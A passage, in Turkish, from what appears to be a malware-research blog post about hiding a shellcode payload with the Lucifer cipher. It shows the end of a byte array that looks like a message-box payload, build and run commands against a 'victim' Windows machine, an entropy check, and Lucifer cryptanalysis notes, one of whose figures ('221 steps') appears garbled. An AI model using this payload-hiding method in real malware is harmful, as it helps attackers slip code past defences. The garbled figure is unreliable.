  0x56, 0xff, 0xd5, 0x4d, 0x65, 0x6f, 0x77, 0x2d, 0x6d, 0x65, 0x6f, 0x77,
  0x21, 0x0, 0x3d, 0x5e, 0x2e, 0x2e, 0x5e, 0x3d, 0x0
};
```

Ayrıca, bu kod dolgu (padding) şemasını ve yük uzunluğunu doğru şekilde korur.    

### demo 2

Hadi her şeyi aksiyonda görelim. Derleyelim (benim `linux` makinemde):    

```bash
x86_64-w64-mingw32-gcc -O2 hack2.c -o hack2.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants \
-static-libstdc++ -static-libgcc
```

![kriptografi](./images/136/2024-10-20_07-58.png){width="80%"}      

Daha sonra, bunu kurbanın makinesinde (`windows 11 x64` benim durumumda) çalıştırın:    

```powershell
.\hack2.exe
```

![kriptografi](./images/136/2024-10-20_08-01_1.png){width="80%"}      

![kriptografi](./images/136/2024-10-20_08-02.png){width="80%"}      

Gördüğünüz gibi, her şey mükemmel çalıştı! =^..^=    

Shannon entropisini hesaplama:    

```bash
python3 entropy.py -f hack2.exe
```

![cryptography](./images/136/2024-10-21_06-53.png){width="80%"}      

Payload'ımız `.text` bölümünde.    

Bildiğiniz gibi, araştırmalarımda ve bu [blogda](https://cocomelonc.github.io/malware/2024/07/16/malware-cryptography-29.html) incelediğim [birçok](https://cocomelonc.github.io/malware/2023/03/09/malware-av-evasion-13.html) şifreleme algoritması [Feistel ağlarını](https://cocomelonc.github.io/malware/2023/08/28/malware-cryptography-20.html) kullanmaktadır.    

### kriptoanaliz

Biham ve Shamir (*E. Biham ve A. Shamir, "Differential Cryptanalysis of Snefru, Khafre, REDOC–II, LOKI, and Lucifer," Advances in Cryptology-CRYPTO ’91 Proceedings, 1992, ss. 156–171* ve *E. Biham ve A. Shamir, Differential Cryptanalysis of the Data Encryption Standard, Springer–Verlag, 1993*) tarafından yapılan analizlerde, `32-bit` bloklar ve `8` tur içeren ilk `Lucifer` sürümünün diferansiyel kriptanalize karşı savunmasız olduğu gösterilmiştir. Bu saldırı `40` seçilmiş açık metin ve \( 2^{29} \) adım gerektirir. Benzer bir saldırı, `128-bit` bloklar ve `8` turluk Lucifer’i `60` seçilmiş açık metin ve \( 2^{53} \) adımda kırabilir. Diferansiyel kriptanaliz saldırısı, `18-turluk`, `128-bit` Lucifer’i `24` seçilmiş açık metin ile `221` adımda başarıyla kırabilmektedir.     

Umarım bu gönderi, kötü amaçlı yazılım araştırmacıları, C/C++ programcıları için faydalı olur, bu ilginç şifreleme tekniği hakkında mavi takım üyelerine farkındalık kazandırır ve kırmızı takımın cephaneliğine bir silah ekler.      

[Kötü Amaçlı Yazılım ve Kriptografi 1](https://cocomelonc.github.io/malware/2023/08/13/malware-cryptography-1.html)      
[Kaynak kodu GitHub'da](https://github.com/cocomelonc/meow/tree/master/2024-10-20-malware-cryptography-33)    
[E. Biham ve A. Shamir, "Differential Cryptanalysis of Snefru, Khafre, REDOC–II, LOKI, and Lucifer," Advances in Cryptology-CRYPTO ’91 Proceedings, 1992, ss. 156–171](https://link.springer.com/chapter/10.1007/3-540-46766-1_11)
